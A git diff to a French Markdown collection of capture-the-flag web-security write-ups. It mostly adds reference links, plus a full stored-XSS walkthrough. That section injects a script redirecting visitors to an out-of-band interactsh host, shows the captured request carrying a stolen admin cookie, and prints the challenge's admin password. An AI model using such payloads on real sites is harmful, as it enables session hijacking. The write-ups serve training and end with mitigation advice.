@@ -23,11 +23,13 @@ Le site vérifie uniquement l'extension, et ne contrôle pas qu'on sort du dossi
 - Contrôler les caractères nul (%00, \x00)
 - Vérifier le mime-type du fichier chargé, pas uniquement l'extension
 
+### Références
+
 [https://www.cve.org/CVERecord?id=CVE-2002-1031](https://www.cve.org/CVERecord?id=CVE-2002-1031)
 [https://www.cve.org/CVERecord?id=CVE-2000-0149](https://www.cve.org/CVERecord?id=CVE-2000-0149)
 
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## PHP - Filters
@@ -61,10 +63,12 @@ Ici, le filtre `convert.base64-encode` encode le contenu du fichier en base64, p
 - Désactiver les wrappers PHP non nécessaires
 - Valider et assainir les entrées utilisateur utilisées dans les chemins de fichiers
 
+### Références
+
 [https://www.php.net/manual/en/filters.convert.php](https://www.php.net/manual/en/filters.convert.php)
 
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## CSRF - Contournement de jeton
@@ -113,10 +117,12 @@ L'attaque CSRF est alors possible en incluant ce token dans la requête malveill
 - Utiliser des tokens CSRF uniques par session
 - Valider l'origine des requêtes via l'en-tête Referer ou Origin
 
+### Références
+
 [https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)
 
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## CSRF where token is not tied to user session
@@ -165,8 +171,12 @@ Le token CSRF n'est pas lié à la session utilisateur, il peut être réutilis�
 
 - Lier les tokens CSRF à la session utilisateur
 
+### Références
+
+[https://portswigger.net/web-security/csrf/bypassing-token-validation#token-not-tied-to-user-session](https://portswigger.net/web-security/csrf/bypassing-token-validation#token-not-tied-to-user-session)
+
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## CSRF where Referer validation depends on header being present
@@ -200,10 +210,12 @@ Si l'en-tête est absent, la validation échoue, permettant à un attaquant de c
 
 - Ne pas se fier uniquement à la présence de l'en-tête Referer pour valider les requêtes
 
+### Références
+
 [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-depends-on-header-being-present] (https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses#validation-of-referer-depends-on-header-being-present)
 
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## JWT - Jeton révoqué
@@ -225,8 +237,12 @@ La vérification de signature tolère un JWT avec padding (=). La liste de révo
 
 Strip les caractères de padding avant de vérifier les JWT [https://github.com/auth0/node-jws/issues/98](https://github.com/auth0/node-jws/issues/98)
 
+### Références
+
+[https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
+
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## SQL injection - Error
@@ -236,7 +252,7 @@ Strip les caractères de padding avant de vérifier les JWT [https://github.com/
 <!-- TODO -->
 
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## Injection de commande - Contournement de filtre
@@ -246,17 +262,70 @@ Strip les caractères de padding avant de vérifier les JWT [https://github.com/
 <!-- TODO -->
 
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## XSS - Stockée 2
 
 [https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2](https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2)
 
-<!-- TODO -->
+Essayer de mettre des scripts grâce à payload all the thing dans le texte de contact ne marche pas
+On a un status en haut a droite "invite". Comme le chall dit de voler un cookie.
+Ouvrir les cookies dans le navigateur et regarder le cookie status=invite.
+Mais le changer par admin ne donne pas plus de droit
+
+1. Ouvrir l'inspecteur, et constater le span avec la class admin
+
+```html
+<span><b>test</b>&nbsp;(<i class="admin">status : admin</i>)</span><br/><span>test</span><br/><hr/>
+```
+
+2. Injecter cette payload :
+
+```html
+"><script>console.log('XSS')</script>
+```
+
+Grâce à un serveur temporaire sur https://app.interactsh.com/#/ et une nouvelle payload :
+
+```html
+"><script>
+  window.location.href="http://hncvjxsvmdrftyrhlpzm4wzqy5sohi4el.oast.fun"
+</script>
+```
+
+3. Récupérer la requete sur le serveur :
+
+```txt
+GET /?c=%22status=invite;%20ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F%22 HTTP/1.1
+Host: hncvjxsvmdrftyrhlpzm574z3js3wvjt1.oast.fun
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: fr
+Connection: keep-alive
+Referer: http://challenge01.root-me.org/
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/93.0.4577.0 Safari/537.36
+```
+
+4. Ajouter le cookie admin pour se connecter a l'espace admin :
+
+Mot de passe : E5HKEGyCXQVsYaehaqeJs0AfV
+
+### Explication
+
+Le champ de saisie n'est pas correctement assaini, permettant l'injection de code JavaScript malveillant.
+
+### Recommandations
+
+- Assainir et échapper les entrées utilisateur avant de les afficher
+
+### Références
+
+[https://portswigger.net/web-security/cross-site-scripting/preventing#validate-input-on-arrival](https://portswigger.net/web-security/cross-site-scripting/preventing#validate-input-on-arrival)
 
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## Server-side template injection in an unknown language with a documented exploit
@@ -266,7 +335,7 @@ Strip les caractères de padding avant de vérifier les JWT [https://github.com/
 <!-- TODO -->
 
 <br />
-<hr style="height:0; border:1px white solid;" />
+<hr style="height: 0; border: 1px white solid;" />
 <br />
 
 ## API - Mass Assignment
